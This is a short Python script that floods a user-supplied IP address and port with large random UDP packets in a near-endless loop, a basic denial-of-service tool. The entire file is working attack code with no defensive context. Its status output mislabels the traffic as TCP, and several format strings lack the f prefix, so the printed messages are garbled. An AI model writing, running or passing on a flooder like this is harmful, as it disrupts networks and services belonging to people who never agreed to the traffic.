import socket, random, time


Cyan = '\033[96m'
Green = '\033[92m'


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = float(input("Sleep: "))
def attack():
    s.connect((ip, port))    
    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Connected to : "+ Green +"{ip} Sent: "+ Green +"{i}: protocol="+ Green +"TCP port="+ Green +"{port}")
        time.sleep(sleep)
attack()